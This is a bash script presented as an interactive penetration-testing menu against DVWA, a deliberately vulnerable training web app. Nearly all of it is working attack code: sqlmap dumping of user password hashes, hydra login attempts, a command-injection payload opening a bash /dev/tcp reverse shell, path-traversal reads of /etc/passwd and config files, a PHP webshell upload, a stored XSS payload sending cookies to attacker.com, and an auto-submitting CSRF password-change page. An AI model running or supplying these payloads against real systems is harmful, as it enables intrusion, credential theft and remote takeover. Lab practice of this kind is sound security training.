#!/bin/bash

#=============================================================================
# DVWA Interactive Penetration Testing Tool
# Description: Menu-driven attack framework for DVWA
# Author: Security Lab
#=============================================================================

# Configuration
TARGET="dvwa"
URL="http://$TARGET"
COOKIE="PHPSESSID=ov8oc9l7qmlcicid43ubqi4n66; security=low"
REPORT_DIR="/tmp/reports"
TIMESTAMP=$(date +%Y%m%d_%H%M%S)
LOG_FILE="$REPORT_DIR/attack_log_$TIMESTAMP.txt"

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
MAGENTA='\033[0;35m'
NC='\033[0m' # No Color
BOLD='\033[1m'

# Create report directory
mkdir -p "$REPORT_DIR"

# Initialize log
echo "=== DVWA Interactive Attack Log ===" > "$LOG_FILE"
echo "Started: $(date)" >> "$LOG_FILE"
echo "" >> "$LOG_FILE"

#=============================================================================
# Helper Functions
#=============================================================================

print_banner() {
    clear
    echo -e "${CYAN}${BOLD}"
    echo "╔════════════════════════════════════════════════════════════════╗"
    echo "║                                                                ║"
    echo "║        DVWA Interactive Penetration Testing Tool               ║"
    echo "║                                                                ║"
    echo "║        Target: $TARGET                                         ║"
    echo "║        URL: $URL                                               ║"
    echo "║                                                                ║"
    echo "╚════════════════════════════════════════════════════════════════╝"
    echo -e "${NC}"
}

print_separator() {
    echo -e "${BLUE}================================================================${NC}"
}

log_result() {
    echo "$1" >> "$LOG_FILE"
    echo "$1"
}

show_success() {
    echo -e "${GREEN}✓ $1${NC}"
    echo "✓ $1" >> "$LOG_FILE"
}

show_error() {
    echo -e "${RED}✗ $1${NC}"
    echo "✗ $1" >> "$LOG_FILE"
}

show_info() {
    echo -e "${YELLOW}→ $1${NC}"
    echo "→ $1" >> "$LOG_FILE"
}

pause() {
    echo ""
    echo -e "${CYAN}Press Enter to continue...${NC}"
    read
}

#=============================================================================
# Attack Functions
#=============================================================================

attack_port_scan() {
    print_separator
    echo -e "${BOLD}${MAGENTA}[1] PORT SCANNING & SERVICE DETECTION${NC}"
    print_separator
    echo ""
    
    show_info "Scanning top 1000 ports on $TARGET..."
    echo ""
    
    nmap -sV --top-ports 1000 $TARGET -T4 -oN /tmp/nmap_scan.txt 2>&1 | tee -a "$LOG_FILE"
    
    if [ $? -eq 0 ]; then
        show_success "Port scan completed"
        echo ""
        echo -e "${YELLOW}Open ports summary:${NC}"
        grep "open" /tmp/nmap_scan.txt | tee -a "$LOG_FILE"
    else
        show_error "Port scan failed"
    fi
    
    pause
}

attack_sql_injection() {
    print_separator
    echo -e "${BOLD}${MAGENTA}[2] SQL INJECTION ATTACK${NC}"
    print_separator
    echo ""
    
    show_info "Target: $URL/vulnerabilities/sqli/"
    show_info "Extracting database credentials..."
    echo ""
    
    ADMIN_PASS=$(sqlmap -u "$URL/vulnerabilities/sqli/?id=1&Submit=Submit" \
        --cookie="$COOKIE" \
        --batch --level=1 --risk=1 \
        -D dvwa -T users -C user,password \
        --dump --threads=10 2>/dev/null | grep -i admin | grep -oP '\(\K[^\)]+')
    
    if [ -n "$ADMIN_PASS" ]; then
        show_success "SQL Injection successful!"
        echo ""
        echo -e "${GREEN}${BOLD}Extracted Credentials:${NC}"
        echo -e "${CYAN}Username: ${BOLD}admin${NC}"
        echo -e "${CYAN}Password Hash: ${BOLD}$ADMIN_PASS${NC}"
        
        log_result "SQL Injection - Username: admin, Password: $ADMIN_PASS"
        
        # Save to file for later use
        echo "$ADMIN_PASS" > /tmp/admin_pass.txt
    else
        show_error "SQL Injection failed or no credentials found"
    fi
    
    pause
}

attack_brute_force() {
    print_separator
    echo -e "${BOLD}${MAGENTA}[3] BRUTE FORCE AUTHENTICATION${NC}"
    print_separator
    echo ""
    
    # Check if we have password from SQL injection
    if [ -f /tmp/admin_pass.txt ]; then
        ADMIN_PASS=$(cat /tmp/admin_pass.txt)
        show_info "Using password from SQL injection: $ADMIN_PASS"
    else
        echo -e "${YELLOW}Enter password to test (or press Enter for default):${NC}"
        read -p "Password: " USER_PASS
        ADMIN_PASS=${USER_PASS:-password}
    fi
    
    echo ""
    show_info "Testing credentials: admin:$ADMIN_PASS"
    show_info "Target: $URL/login.php"
    echo ""
    
    hydra -l admin -p "$ADMIN_PASS" $TARGET \
        http-post-form "/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed" \
        -t 1 -V 2>&1 | tee -a "$LOG_FILE"
    
    if [ $? -eq 0 ]; then
        show_success "Brute force attack completed"
    else
        show_error "Brute force attack failed"
    fi
    
    pause
}

attack_command_injection() {
    print_separator
    echo -e "${BOLD}${MAGENTA}[4] COMMAND INJECTION (REVERSE SHELL)${NC}"
    print_separator
    echo ""
    
    LHOST=$(hostname -I | awk '{print $1}')
    
    echo -e "${YELLOW}Current configuration:${NC}"
    echo -e "${CYAN}Attacker IP: ${BOLD}$LHOST${NC}"
    echo -e "${CYAN}Default Port: ${BOLD}4444${NC}"
    echo ""
    echo -e "${YELLOW}Enter listener port (or press Enter for default 4444):${NC}"
    read -p "Port: " USER_PORT
    LPORT=${USER_PORT:-4444}
    
    echo ""
    show_info "Setting up reverse shell: $LHOST:$LPORT"
    show_info "Target: $URL/vulnerabilities/exec/"
    echo ""
    
    echo -e "${RED}${BOLD}IMPORTANT: Start listener on attacker machine first!${NC}"
    echo -e "${YELLOW}Run this command in another terminal:${NC}"
    echo -e "${CYAN}${BOLD}nc -lvnp $LPORT${NC}"
    echo ""
    echo -e "${YELLOW}Press Enter when listener is ready...${NC}"
    read
    
    PAYLOAD="bash -c 'bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1'"
    ENC=$(printf %s "$PAYLOAD" | sed 's/ /%20/g;s/&/%26/g;s/>/%3E/g')
    
    show_info "Sending payload..."
    curl -s "$URL/vulnerabilities/exec/?ip=127.0.0.1;$ENC&Submit=Submit" --cookie "$COOKIE" >/dev/null &
    
    show_success "Payload sent! Check your listener for connection."
    log_result "Command Injection - Reverse shell to $LHOST:$LPORT"
    
    pause
}

attack_lfi() {
    print_separator
    echo -e "${BOLD}${MAGENTA}[5] LOCAL FILE INCLUSION (LFI)${NC}"
    print_separator
    echo ""
    
    echo -e "${YELLOW}Select file to read:${NC}"
    echo "  1) /etc/passwd"
    echo "  2) DVWA config.inc.php"
    echo "  3) Custom path"
    echo ""
    read -p "Choice [1-3]: " LFI_CHOICE
    
    case $LFI_CHOICE in
        1)
            FILE_PATH="../../../../etc/passwd"
            FILE_DESC="/etc/passwd"
            ;;
        2)
            FILE_PATH="../../../../config/config.inc.php"
            FILE_DESC="config.inc.php"
            ;;
        3)
            echo -e "${YELLOW}Enter file path (with traversal):${NC}"
            read -p "Path: " FILE_PATH
            FILE_DESC="$FILE_PATH"
            ;;
        *)
            show_error "Invalid choice"
            pause
            return
            ;;
    esac
    
    echo ""
    show_info "Target: $URL/vulnerabilities/fi/"
    show_info "Reading file: $FILE_DESC"
    echo ""
    
    LFI_RESULT=$(curl -s "$URL/vulnerabilities/fi/?page=$FILE_PATH" --cookie "$COOKIE")
    
    if [ -n "$LFI_RESULT" ]; then
        show_success "LFI successful!"
        echo ""
        echo -e "${GREEN}${BOLD}File Contents:${NC}"
        echo -e "${CYAN}─────────────────────────────────────────${NC}"
        echo "$LFI_RESULT" | head -n 30
        echo -e "${CYAN}─────────────────────────────────────────${NC}"
        
        # Save to file
        echo "$LFI_RESULT" > "/tmp/lfi_$TIMESTAMP.txt"
        show_info "Full output saved to: /tmp/lfi_$TIMESTAMP.txt"
        
        log_result "LFI - Successfully read $FILE_DESC"
    else
        show_error "LFI failed or file not found"
    fi
    
    pause
}

attack_file_upload() {
    print_separator
    echo -e "${BOLD}${MAGENTA}[6] FILE UPLOAD (WEBSHELL)${NC}"
    print_separator
    echo ""
    
    show_info "Creating PHP webshell..."
    
    cat > /tmp/shell.php <<'EOF'
<?php
echo "<pre>";
system($_GET['cmd']);
echo "</pre>";
?>
EOF
    
    show_success "Webshell created: /tmp/shell.php"
    echo ""
    show_info "Uploading to $URL/vulnerabilities/upload/"
    
    WEBSHELL_URL=$(curl -s -F "uploaded=@/tmp/shell.php;type=image/jpeg" \
        -F "Upload=Upload" "$URL/vulnerabilities/upload/" \
        --cookie "$COOKIE" | grep -o "/hackable/uploads/shell\.php[^\"']*")
    
    if [ -n "$WEBSHELL_URL" ]; then
        show_success "Webshell uploaded successfully!"
        echo ""
        echo -e "${GREEN}${BOLD}Access your webshell at:${NC}"
        echo -e "${CYAN}$URL$WEBSHELL_URL?cmd=<command>${NC}"
        echo ""
        echo -e "${YELLOW}Example commands:${NC}"
        echo -e "${CYAN}  $URL$WEBSHELL_URL?cmd=whoami${NC}"
        echo -e "${CYAN}  $URL$WEBSHELL_URL?cmd=id${NC}"
        echo -e "${CYAN}  $URL$WEBSHELL_URL?cmd=pwd${NC}"
        
        log_result "File Upload - Webshell: $URL$WEBSHELL_URL"
        
        # Save URL
        echo "$URL$WEBSHELL_URL" > /tmp/webshell_url.txt
    else
        show_error "File upload failed"
    fi
    
    pause
}

attack_xss() {
    print_separator
    echo -e "${BOLD}${MAGENTA}[7] STORED CROSS-SITE SCRIPTING (XSS)${NC}"
    print_separator
    echo ""
    
    echo -e "${YELLOW}Select XSS payload:${NC}"
    echo "  1) Simple alert box"
    echo "  2) Cookie stealer"
    echo "  3) Redirect to malicious site"
    echo "  4) Custom payload"
    echo ""
    read -p "Choice [1-4]: " XSS_CHOICE
    
    case $XSS_CHOICE in
        1)
            XSS_PAYLOAD="<script>alert('XSS Vulnerability Found!')</script>"
            ;;
        2)
            XSS_PAYLOAD="<script>alert('Cookies: ' + document.cookie)</script>"
            ;;
        3)
            XSS_PAYLOAD="<script>window.location='http://attacker.com/?cookie='+document.cookie</script>"
            ;;
        4)
            echo -e "${YELLOW}Enter your XSS payload:${NC}"
            read -p "Payload: " XSS_PAYLOAD
            ;;
        *)
            show_error "Invalid choice"
            pause
            return
            ;;
    esac
    
    echo ""
    show_info "Target: $URL/vulnerabilities/xss_s/"
    show_info "Injecting XSS payload..."
    
    curl -s -X POST "$URL/vulnerabilities/xss_s/" --cookie "$COOKIE" \
        -d "txtName=$XSS_PAYLOAD&mtxMessage=Test&btnSign=Sign+Guestbook" >/dev/null
    
    show_success "XSS payload injected!"
    echo ""
    echo -e "${YELLOW}To trigger the XSS, visit:${NC}"
    echo -e "${CYAN}http://localhost:8081/vulnerabilities/xss_s/${NC}"
    
    log_result "Stored XSS - Payload: $XSS_PAYLOAD"
    
    pause
}

attack_csrf() {
    print_separator
    echo -e "${BOLD}${MAGENTA}[8] CROSS-SITE REQUEST FORGERY (CSRF)${NC}"
    print_separator
    echo ""
    
    echo -e "${YELLOW}Enter new password to set via CSRF:${NC}"
    read -p "New Password: " NEW_PASS
    NEW_PASS=${NEW_PASS:-hacked123}
    
    CSRF_FILE="/tmp/csrf_poc_$TIMESTAMP.html"
    
    show_info "Creating CSRF PoC HTML file..."
    
    cat > "$CSRF_FILE" <<EOF
<!DOCTYPE html>
<html>
<head>
    <title>CSRF Attack PoC</title>
    <style>
        body { font-family: Arial, sans-serif; padding: 20px; }
        .container { max-width: 600px; margin: 0 auto; }
        h1 { color: #e74c3c; }
        .info { background: #f0f0f0; padding: 15px; margin: 20px 0; }
    </style>
</head>
<body onload="document.forms[0].submit()">
    <div class="container">
        <h1>🔒 CSRF Password Change Attack</h1>
        <div class="info">
            <h3>Attack Details:</h3>
            <ul>
                <li><strong>Target:</strong> $URL/vulnerabilities/csrf/</li>
                <li><strong>New Password:</strong> $NEW_PASS</li>
                <li><strong>Status:</strong> Auto-submitting form...</li>
            </ul>
        </div>
        
        <form action="$URL/vulnerabilities/csrf/" method="POST">
            <input type="hidden" name="password_new" value="$NEW_PASS">
            <input type="hidden" name="password_conf" value="$NEW_PASS">
            <input type="hidden" name="Change" value="Change">
        </form>
        
        <p>If auto-submit doesn't work, click the button below:</p>
        <button onclick="document.forms[0].submit()">Submit CSRF Attack</button>
    </div>
</body>
</html>
EOF
    
    show_success "CSRF PoC created!"
    echo ""
    echo -e "${GREEN}${BOLD}CSRF PoC Details:${NC}"
    echo -e "${CYAN}File Location: ${BOLD}$CSRF_FILE${NC}"
    echo -e "${CYAN}New Password: ${BOLD}$NEW_PASS${NC}"
    echo ""
    echo -e "${YELLOW}How to use:${NC}"
    echo -e "  1. Victim must be logged into DVWA"
    echo -e "  2. Open this file in victim's browser: ${BOLD}file://$CSRF_FILE${NC}"
    echo -e "  3. Password will be changed automatically"
    
    log_result "CSRF PoC - File: $CSRF_FILE, New Pass: $NEW_PASS"
    
    pause
}

run_all_attacks() {
    print_separator
    echo -e "${BOLD}${MAGENTA}[9] RUN ALL ATTACKS (AUTOMATED)${NC}"
    print_separator
    echo ""
    
    echo -e "${RED}${BOLD}WARNING: This will run all attacks sequentially!${NC}"
    echo -e "${YELLOW}Are you sure? (y/N):${NC}"
    read -p "" CONFIRM
    
    if [[ ! "$CONFIRM" =~ ^[Yy]$ ]]; then
        show_info "Cancelled by user"
        pause
        return
    fi
    
    echo ""
    show_info "Starting automated attack sequence..."
    sleep 2
    
    attack_port_scan
    attack_sql_injection
    attack_brute_force
    attack_command_injection
    attack_lfi
    attack_file_upload
    attack_xss
    attack_csrf
    
    print_separator
    show_success "All attacks completed!"
    echo ""
    echo -e "${GREEN}${BOLD}Full log saved to: $LOG_FILE${NC}"
    
    pause
}

view_logs() {
    print_separator
    echo -e "${BOLD}${MAGENTA}[L] VIEW ATTACK LOGS${NC}"
    print_separator
    echo ""
    
    if [ -f "$LOG_FILE" ]; then
        echo -e "${CYAN}Current log: $LOG_FILE${NC}"
        echo ""
        cat "$LOG_FILE"
    else
        show_error "No log file found"
    fi
    
    echo ""
    echo -e "${YELLOW}All reports location: $REPORT_DIR${NC}"
    ls -lh "$REPORT_DIR" 2>/dev/null
    
    pause
}

show_configuration() {
    print_separator
    echo -e "${BOLD}${MAGENTA}[C] CURRENT CONFIGURATION${NC}"
    print_separator
    echo ""
    
    echo -e "${CYAN}Target Settings:${NC}"
    echo -e "  Target Host: ${BOLD}$TARGET${NC}"
    echo -e "  Target URL: ${BOLD}$URL${NC}"
    echo -e "  Session Cookie: ${BOLD}${COOKIE:0:50}...${NC}"
    echo ""
    
    echo -e "${CYAN}Network Information:${NC}"
    LHOST=$(hostname -I | awk '{print $1}')
    echo -e "  Attacker IP: ${BOLD}$LHOST${NC}"
    echo ""
    
    echo -e "${CYAN}Output Locations:${NC}"
    echo -e "  Report Directory: ${BOLD}$REPORT_DIR${NC}"
    echo -e "  Current Log: ${BOLD}$LOG_FILE${NC}"
    echo ""
    
    echo -e "${CYAN}Target Status:${NC}"
    if curl -s --max-time 3 "$URL" >/dev/null 2>&1; then
        echo -e "  ${GREEN}✓ Target is reachable${NC}"
    else
        echo -e "  ${RED}✗ Target is NOT reachable${NC}"
    fi
    
    pause
}

#=============================================================================
# Main Menu
#=============================================================================

show_menu() {
    print_banner
    echo ""
    echo -e "${BOLD}${CYAN}═══════════════════ ATTACK MENU ════════════════════${NC}"
    echo ""
    echo -e "  ${BOLD}${GREEN}[1]${NC} Port Scanning & Service Detection"
    echo -e "  ${BOLD}${GREEN}[2]${NC} SQL Injection (Database Extraction)"
    echo -e "  ${BOLD}${GREEN}[3]${NC} Brute Force Authentication"
    echo -e "  ${BOLD}${GREEN}[4]${NC} Command Injection (Reverse Shell)"
    echo -e "  ${BOLD}${GREEN}[5]${NC} Local File Inclusion (LFI)"
    echo -e "  ${BOLD}${GREEN}[6]${NC} File Upload (Webshell)"
    echo -e "  ${BOLD}${GREEN}[7]${NC} Stored Cross-Site Scripting (XSS)"
    echo -e "  ${BOLD}${GREEN}[8]${NC} Cross-Site Request Forgery (CSRF)"
    echo ""
    echo -e "  ${BOLD}${YELLOW}[9]${NC} Run All Attacks (Automated)"
    echo ""
    echo -e "  ${BOLD}${BLUE}[L]${NC} View Attack Logs"
    echo -e "  ${BOLD}${BLUE}[C]${NC} Show Configuration"
    echo ""
    echo -e "  ${BOLD}${RED}[Q]${NC} Quit"
    echo ""
    echo -e "${CYAN}═══════════════════════════════════════════════════${NC}"
    echo ""
}

main() {
    while true; do
        show_menu
        echo -e "${YELLOW}Select an option:${NC} "
        read -p "" CHOICE
        
        case $CHOICE in
            1) attack_port_scan ;;
            2) attack_sql_injection ;;
            3) attack_brute_force ;;
            4) attack_command_injection ;;
            5) attack_lfi ;;
            6) attack_file_upload ;;
            7) attack_xss ;;
            8) attack_csrf ;;
            9) run_all_attacks ;;
            [Ll]) view_logs ;;
            [Cc]) show_configuration ;;
            [Qq]) 
                echo ""
                echo -e "${GREEN}Thank you for using DVWA Attack Tool!${NC}"
                echo -e "${YELLOW}Logs saved to: $LOG_FILE${NC}"
                echo ""
                exit 0
                ;;
            *)
                echo -e "${RED}Invalid option. Please try again.${NC}"
                sleep 1
                ;;
        esac
    done
}

# Run main function
main
